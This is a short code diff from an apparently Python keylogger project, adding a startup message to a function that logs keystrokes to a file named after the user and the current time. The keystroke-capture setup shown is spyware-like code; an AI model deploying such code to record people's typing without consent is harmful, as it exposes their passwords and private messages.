@@ -5,7 +5,7 @@ from user_name import user_name
 
 
 def key_logger():
-
+    print("Key Logger start and running..")
     logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, format="%(asctime)s: %(message)s")
 
     # define a callback function to process the keystrokes
